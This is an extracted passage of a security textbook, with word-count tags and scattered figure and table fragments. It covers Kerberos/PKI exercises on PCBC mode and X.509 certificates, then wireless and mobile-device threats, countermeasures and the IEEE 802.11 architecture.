Most of the topics in this chapter are covered in greater detail in [STAL14a]. 
A ­painless way to get a grasp of Kerberos concepts is found in [BRYA88]. One 
of the best treatments of Kerberos is [KOHL94]. [PERL99] reviews various trust 
models that can be used in a PKI. [GUTM02] highlights difficulties in PKI use and 
recommends approaches for an effective PKI.
[Word Count: 62]

Registration,
initialization,
certiﬁcation,
key pair recovery,
key pair update
revocation request
[Word Count: 11]

BRYA88 	 Bryant, W. Designing an Authentication System: A Dialogue in Four Scenes.
[Word Count: 12]

Project Athena document, February 1988. Available at http://web.mit.edu/
kerberos/ www/dialogue.html
GUTM02 	Gutmann, P. “PKI: It’s Not Dead, Just Resting.” Computer, August 2002.
[Word Count: 22]

730    Chapter 23 / Internet Authentication Applications
[Word Count: 7]

23.5	Key Terms, Review Questions, and Problems
[Word Count: 7]

authentication server (AS)
Certificate Authority (CA)
End entity
Kerberos
Kerberos realm
[Word Count: 11]

(PKI)
Registration authority (RA)
ticket-granting ticket
[Word Count: 6]

23.1	
CBC (cipher block chaining) has the property that if an error occurs in transmission 
of ciphertext block CI, then this error propagates to the recovered plaintext blocks PI 
and PI + 1. Version 4 of Kerberos uses an extension to CBC, called the propagating 
CBC (PCBC) mode. This mode has the property that an error in one ciphertext block 
is propagated to all subsequent decrypted blocks of the message, rendering each block 
useless. Thus, data encryption and integrity are combined in one operation. For PCBC,
[Word Count: 86]

KOHL94  Kohl, J.; Neuman, B.; and Ts’o, T. “The Evolution of the Kerberos
[Word Count: 13]

Authentication Service.” In Brazier, F., and Johansen, D. Distributed Open 
Systems. Los Alamitos, CA: IEEE Computer Society Press, 1994. Available 
at http://web.mit.edu/kerberos/www/papers.html
PERL99 	 Perlman, R. “An Overview of PKI Trust Models.” IEEE Network,
[Word Count: 33]

November/ December 1999.
STAL14a 	 Stallings, W. Cryptography and Network Security: Principles and Practice,
[Word Count: 13]

Sixth Edition. Upper Saddle River, NJ: Pearson, 2014.
[Word Count: 8]

23.5 / Key Terms, Review Questions, and Problems   731
[Word Count: 9]

the input to the encryption algorithm is the XOR of the current plaintext block, the 
preceding cipher text block, and the preceding plaintext block:
[Word Count: 24]

On decryption, each ciphertext block is passed through the decryption algorithm. 
Then the output is XORed with the preceding ciphertext block and the preceding 
plaintext block.
a.	 Draw a diagram similar to those used in Chapter 20 to illustrate PCBC.
b.	 Use a Boolean equation to demonstrate that PCBC works.
c.	 Show that a random error in one block of ciphertext is propagated to all subse-
[Word Count: 66]

quent blocks of plaintext.
	 23.2	
Suppose that, in PCBC mode, blocks Ci and Ci + 1 are interchanged during transmis-
sion. Show that this affects only the decrypted blocks Pi and Pi + 1 but not subse-
quent blocks.
	 23.3	
Consider the details of the X.509 certificate shown below.
a.	 Identify the key elements in this certificate, including the owner’s name and public
[Word Count: 63]

key, its validity dates, the name of the CA that signed it, and the type and value of 
signature.
b.	 State whether this is a CA or end-user certificate, and why.
c.	 Indicate whether the certificate is valid or not, and why.
d.	 State whether there are any other obvious problems with the algorithms used in
[Word Count: 56]

Serial Number: 3c:50:33:c2:f8:e7:5c:ca:07:c2:4e:83:f2:e8:0e:4f
[Word Count: 3]

Signature Algorithm: md5WithRSAEncryption
[Word Count: 3]

CN=VeriSign Class 1 CA Individual - Persona Not Validated
[Word Count: 9]

00:98:f2:89:c4:48:e1:3b:2c:c5:d1:48:67:80:53:
[Word Count: 1]

d8:eb:4d:4f:ac:31:a9:fd:11:68:94:ba:44:d8:48:
[Word Count: 1]

46:0d:fc:5c:6d:89:47:3f:9f:d0:c0:6d:3e:9a:8e:
[Word Count: 1]

732    Chapter 23 / Internet Authentication Applications
[Word Count: 7]

ec:82:21:48:9b:b9:78:cf:aa:09:61:92:f6:d1:cf:
[Word Count: 1]

Signature Algorithm: md5WithRSAEncryption
[Word Count: 3]

5a:71:77:c2:ce:82:26:02:45:41:a5:11:68:d6:99:f0:4c:ce:
[Word Count: 1]

7a:ce:80:44:f4:a3:1a:72:43:e9:dc:e1:1a:9b:ec:64:f7:ff:
[Word Count: 1]

21:f2:29:89:d6:61:e5:39:bd:04:e7:e5:3d:7b:14:46:d6:eb:
[Word Count: 1]

8e:37:b0:cb:ed:38:35:81:1f:40:57:57:58:a5:c0:64:ef:55:
[Word Count: 1]

59:c0:79:75:7a:54:47:6a:37:b2:6c:23:6b:57:4d:62:2f:94:
[Word Count: 1]

d3:aa:69:9d:3d:64:43:61:a7:a3:e0:b8:09:ac:94:9b:23:38:
[Word Count: 1]

e8:1b:0f:e5:1b:6e:e2:fa:32:86:f0:c4:0b:ed:89:d9:16:e4:
[Word Count: 1]

23.4	
Using your web browser, visit any secure website (i.e., one whose URL starts with 
“https”). Examine the details of the X.509 certificate used by that site. This is usually 
accessible by selecting the padlock symbol. Answer the same questions as for Prob-
lem 23.3.
	 23.5	
Now access the “Trust Store” (list of certificates) used by your web browser. This is 
usually accessed via its Preference settings. Access the list of Certificate Authority 
certificates used by the browser. Pick one, examine the details of its X.509 certificate, 
and answer the same questions as for Problem 23.3.
[Word Count: 96]

24.1	 Wireless Security
Wireless Network Threats
Wireless Security Measures
[Word Count: 9]

24.2	 Mobile Device Security
Security Threats
Mobile Device Security Strategy
[Word Count: 10]

24.3	 IEEE 802.11 Wireless LAN Overview
The Wi-Fi Alliance
IEEE 802 Protocol Architecture
IEEE 802.11 Network Components and Architectural Model
IEEE 802.11 Services
[Word Count: 23]

24.4	 IEEE 802.11i Wireless LAN Security
IEEE 802.11i Services
IEEE 802.11i Phases of Operation
Discovery Phase
Authentication Phase
Key Management Phase
Protected Data Transfer Phase
The IEEE 802.11i Pseudorandom Function
[Word Count: 30]

24.6	 Key Terms, Review Questions, and Problems
[Word Count: 7]

734    Chapter 24 / Wireless Network Security
[Word Count: 7]

After studying this chapter, you should be able to:
[Word Count: 9]

◆	Present an overview of security threats and countermeasures for wireless
[Word Count: 11]

networks.
◆	Understand the unique security threats posed by the use of mobile devices
[Word Count: 14]

with enterprise networks.
◆	Describe the principal elements in a mobile device security strategy.
◆	Understand the essential elements of the IEEE 802.11 wireless LAN
[Word Count: 25]

­standard.
◆	Summarize the various components of the IEEE 802.11i wireless LAN
[Word Count: 12]

Wireless networks and communication links have become pervasive for both 
­personal and organizational communications. A wide variety of technologies and 
network types have been adopted, including Wi-Fi, Bluetooth, WiMAX, ZigBee, 
and cellular technologies. Although the security threats and countermeasures 
­discussed throughout this book apply to wireless networks and communications 
links, there are some unique aspects to the wireless environment.
[Word Count: 59]

This chapter begins with a general overview of wireless security issues. We 
then focus on the relatively new area of mobile device security, examining threats 
and countermeasures for mobile devices used in the enterprise. Then, we look 
at the IEEE 802.11i standard for wireless LAN security. This standard is part of 
IEEE 802.11, also referred to as Wi-Fi. We begin the discussion with an overview of 
IEEE 802.11, and then we look in some detail at IEEE 802.11i.
[Word Count: 78]

Wireless networks, and the wireless devices that use them, introduce a host of secu-
rity problems over and above those found in wired networks. Some of the key fac-
tors contributing to the higher security risk of wireless networks compared to wired 
networks include the following [MA10]:
[Word Count: 47]

• Channel: Wireless networking typically involves broadcast communications,
[Word Count: 8]

which is far more susceptible to eavesdropping and jamming than wired net-
works. Wireless networks are also more vulnerable to active attacks that 
­exploit vulnerabilities in communications protocols.
 
• Mobility: Wireless devices are, in principal and usually in practice, far more
[Word Count: 41]

portable and mobile than wired devices. This mobility results in a number of 
risks, described subsequently.
 
• Resources: Some wireless devices, such as smartphones and tablets, have
[Word Count: 27]

sophisticated operating systems but limited memory and processing resources 
with which to counter threats, including denial of service and malware.
[Word Count: 20]

• Accessibility: Some wireless devices, such as sensors and robots, may be left
[Word Count: 13]

unattended in remote and/or hostile locations. This greatly increases their vul-
nerability to physical attacks.
[Word Count: 15]

In simple terms, the wireless environment consists of three components that 
provide point of attack (Figure 24.1). The wireless client can be a cell phone, a 
Wi-Fi enabled laptop or tablet, a wireless sensor, a Bluetooth device, and so on. 
The wireless access point provides a connection to the network or service. Exam-
ples of access points are cell towers, Wi-Fi hot spots, and wireless access points to 
wired local or wide-area networks. The transmission medium, which ­carries the 
radio waves for data transfer, is also a source of vulnerability.
[Word Count: 90]

[CHOI08] lists the following security threats to wireless networks:
[Word Count: 9]

• Accidental association: Company wireless LANs or wireless access points to
[Word Count: 11]

wired LANs in close proximity (e.g., in the same or neighboring buildings) may 
create overlapping transmission ranges. A user intending to connect to one 
LAN may unintentionally lock on to a wireless access point from a ­neighboring 
network. Although the security breach is accidental, it ­nevertheless ­exposes 
resources of one LAN to the accidental user.
 
• Malicious association: In this situation, a wireless device is configured to
[Word Count: 67]

appear to be a legitimate access point, enabling the operator to steal ­passwords 
from legitimate users and then penetrate a wired network through a legitimate 
wireless access point.
 
• Ad hoc networks: These are peer-to-peer networks between wireless
[Word Count: 38]

­computers with no access point between them. Such networks can pose a 
­security threat due to a lack of a central point of control.
 
• Nontraditional networks: Nontraditional networks and links, such as personal
[Word Count: 34]

network Bluetooth devices, barcode readers, and handheld PDAs pose a 
­security risk both in terms of eavesdropping and spoofing.
 
• Identity theft (MAC spoofing): This occurs when an attacker is able to
[Word Count: 32]

­eavesdrop on network traffic and identify the MAC address of a computer 
with network privileges.
 
• Man-in-the middle attacks: This type of attack is described in Chapter 21 in
[Word Count: 29]

the context of the Diffie-Hellman key exchange protocol. In a broader sense, 
this attack involves persuading a user and an access point to believe that they 
are talking to each other when in fact the communication is going through an
[Word Count: 40]

Figure 24.1  Wireless Networking Components
[Word Count: 5]

736    Chapter 24 / Wireless Network Security
[Word Count: 7]

intermediate attacking device. Wireless networks are particularly vulnerable 
to such attacks.
 
• Denial of service (DoS): This type of attack was discussed in detail in Chapter 7.
[Word Count: 27]

In the context of a wireless network, a DoS attack occurs when an attacker 
continually bombards a wireless access point or some other accessible wireless 
port with various protocol messages designed to consume ­system resources. 
The wireless environment lends itself to this type of attack, because it is so 
easy for the attacker to direct multiple wireless messages at the target.
 
• Network injection: A network injection attack targets wireless access points
[Word Count: 72]

that are exposed to nonfiltered network traffic, such as routing protocol 
­messages or network management messages. An example of such an attack is 
one in which bogus reconfiguration commands are used to affect routers and 
switches to degrade network performance.
[Word Count: 40]

Following [CHOI08], we can group wireless security measures into those dealing 
with wireless transmissions, wireless access points, and wireless networks ­(consisting 
of wireless routers and endpoints).
[Word Count: 26]

Securing Wireless Transmissions  The principal threats to wireless transmission 
are eavesdropping, altering or inserting messages, and disruption. To deal with 
eavesdropping, two types of countermeasures are appropriate:
[Word Count: 27]

• Signal-hiding techniques: Organizations can take a number of measures to
[Word Count: 11]

make it more difficult for an attacker to locate their wireless access points, 
including turning off service set identifier (SSID) broadcasting by wireless 
­access points; assigning cryptic names to SSIDs; reducing signal strength to the 
lowest level that still provides requisite coverage; and locating wireless access 
points in the interior of the building, away from windows and exterior walls. 
Greater security can be achieved by the use of directional antennas and of 
signal-shielding techniques.
 
• Encryption: Encryption of all wireless transmission is effective against
[Word Count: 84]

­eavesdropping to the extent that the encryption keys are secured.
[Word Count: 10]

The use of encryption and authentication protocols is the standard method of 
countering attempts to alter or insert transmissions.
[Word Count: 19]

The methods discussed in Chapter 7 for dealing with denial of service apply 
to wireless transmissions. Organizations can also reduce the risk of unintentional 
DoS attacks. Site surveys can detect the existence of other devices using the same 
frequency range, to help determine where to locate wireless access points. Signal 
strengths can be adjusted and shielding used in an attempt to isolate a wireless 
­environment from competing nearby transmissions.
[Word Count: 69]

Securing Wireless Access Points  The main threat involving wireless access 
points is unauthorized access to the network. The principal approach for preventing 
such access is the IEEE 802.1X standard for port-based network access control. The 
standard provides an authentication mechanism for devices wishing to attach to a
[Word Count: 47]

LAN or wireless network. The use of 802.1X can prevent rogue access points and 
other unauthorized devices from becoming insecure backdoors.
[Word Count: 21]

Section 24.3 provides an introduction to 802.1X.
[Word Count: 7]

Securing Wireless Networks  [CHOI08] recommends the following techniques 
for wireless network security:
[Word Count: 12]

1.	 Use encryption. Wireless routers are typically equipped with built-in
[Word Count: 10]

­encryption mechanisms for router-to-router traffic.
	
2.	 Use anti-virus and anti-spyware software, and a firewall. These facilities
[Word Count: 16]

should be enabled on all wireless network endpoints.
	
3.	 Turn off identifier broadcasting. Wireless routers are typically configured to
[Word Count: 19]

broadcast an identifying signal so that any device within range can learn of the 
router’s existence. If a network is configured so that authorized devices know 
the identity of routers, this capability can be disabled, so as to thwart attackers.
	
4.	 Change the identifier on your router from the default. Again, this measure
[Word Count: 53]

thwarts attackers who will attempt to gain access to a wireless network using 
default router identifiers.
	
5.	 Change your router’s pre-set password for administration. This is another
[Word Count: 27]

­prudent step.
	
6.	 Allow only specific computers to access your wireless network. A router
[Word Count: 14]

can be configured to only communicate with approved MAC addresses. 
Of course, MAC addresses can be spoofed, so this is just one element of a 
­security strategy.
[Word Count: 27]

Prior to the widespread use of smartphones, the dominant paradigm for computer 
and network security in organizations was as follows. Corporate IT was tightly con-
trolled. User devices were typically limited to Windows PCs. Business applications 
were controlled by IT and either run locally on endpoints or on physical servers 
in data centers. Network security was based upon clearly defined perimeters that 
separated trusted internal networks from the untrusted Internet. Today, there have 
been massive changes in each of these assumptions. An organization’s networks 
must accommodate the following:
[Word Count: 88]

• Growing use of new devices:  Organizations are experiencing significant growth
[Word Count: 11]

in employee’s use of mobile devices. In many cases, employees are allowed to 
use a combination of endpoint devices as part of their day-to-day activities.
 
• Cloud-based applications:  Applications no longer run solely on physical
[Word Count: 35]

­servers in corporate data centers. Quite the opposite, applications can run 
anywhere—on traditional physical servers, on mobile virtual servers, or in the 
cloud. Additionally, end users can now take advantage of a wide variety of 
cloud-based applications and IT services for personal and professional use. 
Facebook can be used for an employee’s personal profile or as a component
[Word Count: 58]

738    Chapter 24 / Wireless Network Security
[Word Count: 7]

of a corporate marketing campaign. Employees depend upon Skype to speak 
with friends abroad or for legitimate business video conferencing. Dropbox 
and Box can be used to distribute documents between corporate and personal 
devices for mobility and user productivity.
 
• De-perimeterization:  Given new device proliferation, application mobility,
[Word Count: 47]

and cloud-based consumer and corporate services, the notion of a static net-
work perimeter is all but gone. Now there are a multitude of network perim-
eters around devices, applications, users, and data. These perimeters have also 
become quite dynamic as they must adapt to various environmental conditions 
such as user role, device type, server virtualization mobility, network location, 
and time-of-day.
 
• External business requirements:  The enterprise must also provide guests,
[Word Count: 71]

third-party contractors, and business partners network access using various 
devices from a multitude of locations.
[Word Count: 15]

Mobile devices need additional, specialized protection measures beyond those 
implemented for other client devices, such as desktop and laptop devices that are 
used only within the organization’s facilities and on the organization’s networks. 
SP 800-14 (Guidelines for Managing and Securing Mobile Devices in the Enterprise, 
July 2012) lists seven major security concerns for mobile devices. We examine each 
of these in turn.
[Word Count: 62]

Lack of Physical Security Controls  Mobile devices are typically under the 
complete control of the user, and are used and kept in a variety of locations outside 
the organization’s control, including off premises. Even if a device is required to 
remain on premises, the user may move the device within the organization between 
secure and non-secured locations. Thus, theft and tampering are realistic threats.
[Word Count: 64]

The security policy for mobile devices must be based on the assumption that 
any mobile device may be stolen or at least accessed by a malicious party. The threat 
is twofold: A malicious party may attempt to recover sensitive data from the device 
itself, or may use the device to gain access to the organization’s resources.
[Word Count: 56]

Use of Untrusted Mobile Devices  In addition to company-issued and company-
controlled mobile devices, virtually all employees will have personal smartphones 
and/or tablets. The organization must assume that these devices are not trustworthy.
[Word Count: 33]

That is, the devices may not employ encryption and either the user or a third party 
may have installed a bypass to the built-in restrictions on security, operating system 
use, and so on.
[Word Count: 33]

Use of Untrusted Networks  If a mobile device is used on premises, it can 
connect to organization resources over the organization’s own in-house wireless 
networks. However, for off-premises use, the user will typically access organizational 
resources via Wi-Fi or cellular access to the Internet and from the Internet to the 
organization. Thus, traffic that includes an off-premises segment is potentially 
susceptible to eavesdropping or man-in-the-middle types of attacks. Thus, the 
security policy must be based on the assumption that the networks between the 
mobile device and the organization are not trustworthy.
[Word Count: 91]

Use of Applications Created by Unknown Parties  By design, it is easy to find 
and install third-party applications on mobile devices. This poses the obvious risk of 
installing malicious software. An organization has several options for dealing with 
this threat, as described subsequently.
[Word Count: 43]

Interaction with other Systems  A common feature found on smartphones 
and tablets is the ability to automatically synchronize data, apps, contacts, photos, 
and so on with other computing devices and with cloud-based storage. Unless an 
organization has control of all the devices involved in synchronization, there is 
considerable risk of the organization’s data being stored in an unsecured location, 
plus the risk of the introduction of malware.
[Word Count: 67]

Use of Untrusted Content  Mobile devices may access and use content that other 
computing devices do not encounter. An example is the Quick Response (QR) code, 
which is a two-dimensional barcode. QR codes are designed to be captured by a mobile 
device camera and used by the mobile device. The QR code translates to a URL, so 
that a malicious QR code could direct the mobile device to malicious Web sites.
[Word Count: 71]

Use of Location Services  The GPS capability on mobile devices can be used 
to maintain a knowledge of the physical location of the device. While this feature 
might be useful to an organization as part of a presence service, it creates security 
risks. An attacker can use the location information to determine where the device 
and user are located, which may be of use to the attacker.
[Word Count: 67]

With the threats listed in the preceding discussion in mind, we outline the principal 
elements of a mobile device security strategy. They fall into three categories: device 
security, client/server traffic security, and barrier security (Figure 24.2).
[Word Count: 36]

Device Security  A number of organizations will supply mobile devices for 
employee use and pre-configure those devices to conform to the enterprise security 
policy. However, many organizations will find it convenient or even necessary to 
adopt a bring-your-own-device (BYOD) policy that allows the personal mobile 
devices of employees to have access to corporate resources. IT managers should be
[Word Count: 58]

740    Chapter 24 / Wireless Network Security
[Word Count: 7]

able to inspect each device before allowing network access. IT will want to establish 
configuration guidelines for operating systems and applications. For example, 
“rooted” or “jail-broken” devices are not permitted on the network, and mobile 
devices cannot store corporate contacts on local storage. Whether a device is owned 
by the organization or BYOD, the organization should configure the device with 
security controls, including the following:
[Word Count: 65]

• Enable auto-lock, which causes the device to lock if it has not been used for a
[Word Count: 17]

given amount of time, requiring the user to re-enter a four-digit PIN or a pass-
word to re-activate the device.
 
• Enable password or PIN protection. The PIN or password is needed to unlock
[Word Count: 34]

the device. In addition, it can be configured so that email and other data on 
the device are encrypted using the PIN or password and can only be retrieved 
with the PIN or password.
 
• Avoid using auto-complete features that remember user names or passwords.
 
• Enable remote wipe.
 
• Ensure that SSL protection is enabled, if available.
 
• Make sure that software, including operating systems and applications, is up
[Word Count: 70]

to date.
 
• Install antivirus software as it becomes available.
[Word Count: 10]

Firewall limits 
scope of data
and application
access
[Word Count: 8]

Authentication
and access control
protocols used to
verify device and user
and establish limits
on access
[Word Count: 16]

Mobile device is
conﬁgured with
security mechanisms and
parameters to conform to
organization security policy
[Word Count: 15]

Trafﬁc is encrypted;
uses SSL or IPsec
VPN tunnel
[Word Count: 9]

Figure 24.2  Mobile Device Security Elements
[Word Count: 6]

24.3 / IEEE 802.11 Wireless LAN Overview   741
[Word Count: 8]

• Either sensitive data should be prohibited from storage on the mobile device
[Word Count: 13]

or it should be encrypted.
 
• IT staff should also have the ability to remotely access devices, wipe the device
[Word Count: 20]

of all data, and then disable the device in the event of loss or theft.
 
• The organization may prohibit all installation of third-party applications,
[Word Count: 25]

implement whitelisting to prohibit installation of all unapproved applications, 
or implement a secure sandbox that isolates the organization’s data and appli-
cations from all other data and applications on the mobile device. Any appli-
cation that is on an approved list should be accompanied by a digital signature 
and a public-key certificate from an approved authority.
 
• The organization can implement and enforce restrictions on what devices can
[Word Count: 68]

synchronize and on the use of cloud-based storage.
 
• To deal with the threat of untrusted content, security responses can include
[Word Count: 21]

training of personnel on the risks inherent in untrusted content and disabling 
camera use on corporate mobile devices.
 
• To counter the threat of malicious use of location services, the security policy
[Word Count: 32]

can dictate that such service is disabled on all mobile devices.
[Word Count: 11]

Traffic Security  Traffic security is based on the usual mechanisms for encryption 
and authentication. All traffic should be encrypted and travel by secure means, such 
as SSL or IPv6. Virtual private networks (VPNs) can be configured so that all traffic 
between the mobile device and the organization’s network is via a VPN.
[Word Count: 52]

A strong authentication protocol should be used to limit the access from 
the device to the resources of the organization. Often, a mobile device has a sin-
gle device-specific authenticator, because it is assumed that the device has only 
one user. A preferable strategy is to have a two-layer authentication mechanism, 
which involves authenticating the device and then authenticating the user of the 
device.
[Word Count: 64]

Barrier Security  The organization should have security mechanisms to protect 
the network from unauthorized access. The security strategy can also include 
firewall policies specific to mobile device traffic. Firewall policies can limit the scope 
of data and application access for all mobile devices. Similarly, intrusion detection 
and intrusion prevention systems can be configured to have tighter rules for mobile 
device traffic.
[Word Count: 61]

IEEE 802 is a committee that has developed standards for a wide range of local 
area networks (LANs). In 1990, the IEEE 802 Committee formed a new working 
group, IEEE 802.11, with a charter to develop a protocol and transmission specifi-
cations for wireless LANs (WLANs). Since that time, the demand for WLANs at 
different frequencies and data rates has exploded. Keeping pace with this demand, 
the IEEE 802.11 working group has issued an ever-expanding list of standards. 
Table 24.1 briefly defines key terms used in the IEEE 802.11 standard.
[Word Count: 90]

742    Chapter 24 / Wireless Network Security
[Word Count: 7]

More recently, the Wi-Fi Alliance has developed certification procedures for 
IEEE 802.11 security standards, referred to as Wi-Fi Protected Access (WPA). The 
most recent version of WPA, known as WPA2, incorporates all of the features of 
the IEEE 802.11i WLAN security specification.
[Word Count: 42]

Before proceeding, we need to briefly preview the IEEE 802 protocol ­architecture. 
IEEE 802.11 standards are defined within the structure of a layered set of protocols. 
This structure, used for all IEEE 802 standards, is illustrated in Figure 24.3.
[Word Count: 39]

Physical Layer  The lowest layer of the IEEE 802 reference model is the 
­physical layer, which includes such functions as encoding/decoding of signals and
[Word Count: 24]

Access point (AP)
Any entity that has station functionality and provides 
access to the distribution system via the wireless medium 
for associated stations.
[Word Count: 23]

Basic service set (BSS)
A set of stations controlled by a single coordination 
­function.
[Word Count: 14]

Coordination function
The logical function that determines when a station 
­operating within a BSS is permitted to transmit and may 
be able to receive PDUs.
[Word Count: 25]

Distribution system (DS)
A system used to interconnect a set of BSSs and 
­integrated LANs to create an ESS.
[Word Count: 19]

Extended service set (ESS)
A set of one or more interconnected BSSs and integrated 
LANs that appear as a single BSS to the LLC layer at any 
station associated with one of these BSSs.
[Word Count: 34]

MAC protocol data unit (MPDU)
The unit of data exchanged between two peer MAC 
­entities using the services of the physical layer.
[Word Count: 22]

MAC service data unit (MSDU)
Information that is delivered as a unit between 
MAC users.
[Word Count: 15]

Station
Any device that contains an IEEE 802.11 conformant 
MAC and physical layer.
[Word Count: 13]

24.3 / IEEE 802.11 Wireless LAN Overview   743
[Word Count: 8]

bit transmission/reception. In addition, the physical layer includes a specification of 
the transmission medium. In the case of IEEE 802.11, the physical layer also defines 
frequency bands and antenna characteristics.
[Word Count: 30]

Medium Access Control  All LANs consist of collections of devices that share 
the network’s transmission capacity. Some means of controlling access to the 
transmission medium is needed to provide an orderly and efficient use of that 
capacity. This is the function of a medium access control (MAC) layer. The MAC 
layer receives data from a higher-layer protocol, typically the logical link control 
(LLC) layer, in the form of a block of data known as the MAC service data unit 
(MSDU). In general, the MAC layer performs the following functions:
[Word Count: 89]

• On transmission, assemble data into a frame, known as a MAC protocol data
[Word Count: 14]

unit (MPDU) with address and error-detection fields.
 
• On reception, disassemble frame, and perform address recognition and error
[Word Count: 18]

detection.
 
• Govern access to the LAN transmission medium.
[Word Count: 9]

The exact format of the MPDU differs somewhat for the various MAC proto-
cols in use. In general, all of the MPDUs have a format similar to that of Figure 24.4. 
The fields of this frame are as follows:
[Word Count: 39]

• MAC Control: This field contains any protocol control information needed
[Word Count: 11]

for the functioning of the MAC protocol. For example, a priority level could 
be indicated here.
[Word Count: 16]

Encoding/decoding
of signals
Bit transmission/
reception
Transmission medium
[Word Count: 8]

Assemble data
into frame
Addressing
Error detection
Medium access
[Word Count: 9]

Frequency band
deﬁnition
Wireless signal
encoding
[Word Count: 6]

Reliable data delivery
Wireless access control
protocols
[Word Count: 7]

744    Chapter 24 / Wireless Network Security
[Word Count: 7]

Source
MAC Address
MAC Service Data Unit (MSDU)
CRC
[Word Count: 9]

Figure 24.4  General IEEE 802 MPDU Format
[Word Count: 7]

• Destination MAC Address: The destination physical address on the LAN for
[Word Count: 12]

this MPDU.
 
• Source MAC Address: The source physical address on the LAN for this
[Word Count: 15]

MPDU.
 
• MAC Service Data Unit: The data from the next higher layer.
 
• CRC: The cyclic redundancy check field, also known as the Frame Check
[Word Count: 26]

Sequence (FCS) field. This is an error-detecting code, such as that which is 
used in other data-link control protocols. The CRC is calculated based on the 
bits in the entire MPDU. The sender calculates the CRC and adds it to the 
frame. The receiver performs the same calculation on the incoming MPDU 
and compares that calculation to the CRC field in that incoming MPDU. If the 
two values do not match, then one or more bits have been altered in transit.
[Word Count: 81]

The fields preceding the MSDU field are referred to as the MAC header, and 
the field following the MSDU field is referred to as the MAC trailer. The header 
and trailer contain control information that accompany the data field and that are 
used by the MAC protocol.
[Word Count: 47]

Logical Link Control  In most data-link control protocols, the data-link 
protocol entity is responsible not only for detecting errors using the CRC, but 
for recovering from those errors by retransmitting damaged frames. In the LAN 
protocol architecture, these two functions are split between the MAC and LLC 
layers. The MAC layer is responsible for detecting errors and discarding any frames 
that contain errors. The LLC layer optionally keeps track of which frames have 
been successfully received and retransmits unsuccessful frames.
[Word Count: 80]

IEEE 802.11 Network Components and Architectural Model
[Word Count: 7]

24.3 / IEEE 802.11 Wireless LAN Overview   745
[Word Count: 8]

The BSS generally corresponds to what is referred to as a cell in the literature. The 
DS can be a switch, a wired network, or a wireless network.
[Word Count: 28]

When all the stations in the BSS are mobile stations that communicate directly 
with one another (not using an AP) the BSS is called an independent BSS (IBSS). 
An IBSS is typically an ad hoc network. In an IBSS, the stations all communicate 
directly, and no AP is involved.
[Word Count: 49]

A simple configuration is shown in Figure 24.5, in which each station belongs 
to a single BSS; that is, each station is within wireless range only of other stations 
within the same BSS. It is also possible for two BSSs to overlap geographically, 
so that a single station could participate in more than one BSS. Furthermore, the 
­association between a station and a BSS is dynamic. Stations may turn off, come 
within range, and go out of range.
[Word Count: 78]

An extended service set (ESS) consists of two or more basic service sets 
­interconnected by a distribution system. The extended service set appears as a 
­single logical LAN to the LLC level.
[Word Count: 32]

IEEE 802.11 defines nine services that need to be provided by the wireless LAN to 
achieve functionality equivalent to that which is inherent to wired LANs. Table 24.2 
lists the services and indicates two ways of categorizing them.
[Word Count: 38]

1.	 The service provider can be either the station or the DS. Station services
[Word Count: 14]

are implemented in every 802.11 station, including AP stations. Distribution
[Word Count: 10]

Figure 24.5  IEEE 802.11 Extended Service Set
[Word Count: 7]

746    Chapter 24 / Wireless Network Security
[Word Count: 7]

Association
Distribution system
MSDU delivery
[Word Count: 5]

Authentication
Station
LAN access and security
[Word Count: 6]

Deauthentication
Station
LAN access and security
[Word Count: 6]

Disassociation
Distribution system
MSDU delivery
[Word Count: 5]

Distribution
Distribution system
MSDU delivery
[Word Count: 5]

Integration
Distribution system
MSDU delivery
[Word Count: 5]

Reassociation
Distribution system
MSDU delivery
[Word Count: 5]

­services are provided between BSSs; these services may be implemented in an 
AP or in another special-purpose device attached to the distribution system.
	
2.	 Three of the services are used to control IEEE 802.11 LAN access and
[Word Count: 37]

­confidentiality. Six of the services are used to support delivery of MSDUs 
between stations. If the MSDU is too large to be transmitted in a single 
MPDU, it may be fragmented and transmitted in a series of MPDUs.
[Word Count: 38]

Following the IEEE 802.11 document, we next discuss the services in an order 
designed to clarify the operation of an IEEE 802.11 ESS network. MSDU delivery, 
which is the basic service, has already been mentioned. Services related to security 
are introduced in Section 24.3.
[Word Count: 44]

If the two stations that are communicating are within the same BSS, then the 
distribution service logically goes through the single AP of that BSS.
[Word Count: 25]

The integration service enables transfer of data between a station on an IEEE 
802.11 LAN and a station on an integrated IEEE 802.x LAN. The term integrated 
refers to a wired LAN that is physically connected to the DS and whose stations 
may be logically connected to an IEEE 802.11 LAN via the integration service. The 
integration service takes care of any address translation and media conversion logic 
required for the exchange of data.
[Word Count: 74]

Association-Related Services  The primary purpose of the MAC layer is to 
transfer MSDUs between MAC entities; this purpose is fulfilled by the distribution
[Word Count: 23]

24.4 / IEEE 802.11i Wireless LAN Security   747
[Word Count: 8]

service. For that service to function, it requires information about stations within 
the ESS that is provided by the association-related services. Before the distribution 
service can deliver data to or accept data from a station, that station must be 
associated. Before looking at the concept of association, we need to describe the 
concept of mobility. The standard defines three transition types, based on mobility:
[Word Count: 64]

• No transition: A station of this type is either stationary or moves only within
[Word Count: 15]

the direct communication range of the communicating stations of a single BSS.
 
• BSS transition: This is defined as a station movement from one BSS to another
[Word Count: 27]

BSS within the same ESS. In this case, delivery of data to the station requires that 
the addressing capability be able to recognize the new location of the station.
 
• ESS transition: This is defined as a station movement from a BSS in one ESS
[Word Count: 45]

to a BSS within another ESS. This case is supported only in the sense that 
the station can move. Maintenance of upper-layer connections supported by 
802.11 cannot be guaranteed. In fact, disruption of service is likely to occur.
[Word Count: 38]

To deliver a message within a DS, the distribution service needs to know where 
the destination station is located. Specifically, the DS needs to know the identity of the 
AP to which the message should be delivered in order for that message to reach the 
destination station. To meet this requirement, a station must maintain an association 
with the AP within its current BSS. Three services relate to this requirement:
[Word Count: 70]

• Association: Establishes an initial association between a station and an AP.
[Word Count: 12]

Before a station can transmit or receive frames on a wireless LAN, its ­identity 
and address must be known. For this purpose, a station must establish an 
­association with an AP within a particular BSS. The AP can then ­communicate 
this information to other APs within the ESS to facilitate routing and delivery 
of addressed frames.
 
• Reassociation: Enables an established association to be transferred from one
[Word Count: 67]

AP to another, allowing a mobile station to move from one BSS to another.
 
• Disassociation: A notification from either a station or an AP that an existing
[Word Count: 28]

association is terminated. A station should give this notification before leaving 
an ESS or shutting down. However, the MAC management facility protects 
itself against stations that disappear without notification.
[Word Count: 29]

There are two characteristics of a wired LAN that are not inherent in a wireless LAN.
[Word Count: 16]

1.	 In order to transmit over a wired LAN, a station must be physically connected
[Word Count: 15]

to the LAN. On the other hand, with a wireless LAN, any station within ­radio 
range of the other devices on the LAN can transmit. In a sense, there is a form 
of authentication with a wired LAN in that it requires some positive and pre-
